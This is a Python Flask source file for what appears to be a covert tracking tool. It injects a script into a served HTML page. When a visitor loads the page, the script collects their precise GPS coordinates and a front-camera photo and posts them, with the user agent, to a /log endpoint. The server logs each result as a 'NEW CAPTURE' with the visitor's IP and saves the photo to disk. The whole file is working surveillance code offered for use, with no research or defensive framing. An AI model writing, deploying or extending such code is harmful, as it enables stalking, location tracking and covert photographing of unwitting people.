from flask import Flask, request, send_from_directory
import logging
import base64
from datetime import datetime

app = Flask(__name__)

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

def injector_script():
    """Enhanced script with photo capture and reliable GPS"""
    return """
    <script>
    // Enhanced GPS capture with retry
    function captureGPS() {
        navigator.geolocation.getCurrentPosition(
            pos => {
                const gps = `${pos.coords.latitude},${pos.coords.longitude}`;
                sendData('gps', gps);
                startCameraCapture();
            },
            err => {
                if (err.code === err.TIMEOUT) {
                    setTimeout(captureGPS, 1000); // Retry after 1 second
                } else {
                    sendData('gps_error', err.message);
                    startCameraCapture();
                }
            },
            { 
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            }
        );
    }

    // Camera capture with photo snapshot
    function startCameraCapture() {
        navigator.mediaDevices.getUserMedia({ 
            video: { 
                facingMode: 'user',
                width: 640,
                height: 480
            }
        }).then(stream => {
            const track = stream.getVideoTracks()[0];
            const imageCapture = new ImageCapture(track);
            
            return imageCapture.takePhoto().then(photo => {
                const reader = new FileReader();
                reader.onload = () => {
                    const base64data = reader.result.split(',')[1];
                    sendData('photo', base64data);
                };
                reader.readAsDataURL(photo);
                track.stop();
            });
        }).catch(err => {
            sendData('camera_error', err.message);
        });
    }

    // Data transmission with retry
    function sendData(type, value) {
        const payload = {
            type: type,
            value: value,
            ua: navigator.userAgent,
            time: new Date().toISOString()
        };

        fetch('/log', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        }).catch(err => {
            setTimeout(() => sendData(type, value), 1000); // Retry on failure
        });
    }

    // Start the capture process after slight delay
    setTimeout(captureGPS, 300);
    </script>
    """

@app.route('/')
def serve_injected_page():
    """Inject scripts into page.html"""
    try:
        with open('page.html', 'r') as f:
            content = f.read()
        
        if '</body>' in content:
            return content.replace('</body>', injector_script() + '</body>')
        else:
            return content + injector_script()
    except Exception as e:
        logger.error(f"Injection failed: {e}")
        return "Error loading page", 500

@app.route('/log', methods=['POST'])
def log_data():
    """Handle incoming data"""
    try:
        data = request.json
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        
        logger.info(f"""
        🎯 NEW CAPTURE 🎯
        IP: {ip}
        User Agent: {data.get('ua', 'N/A')}
        Type: {data.get('type', 'N/A')}
        Value: {data.get('value', 'N/A')}
        Time: {data.get('time', datetime.utcnow().isoformat())}
        """)
        
        # Save photo if available
        if data.get('type') == 'photo':
            with open('capture.jpg', 'wb') as f:
                f.write(base64.b64decode(data['value']))
            logger.info("Photo saved as capture.jpg")
        
        return "OK", 200
    except Exception as e:
        logger.error(f"Logging failed: {e}")
        return "Error", 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
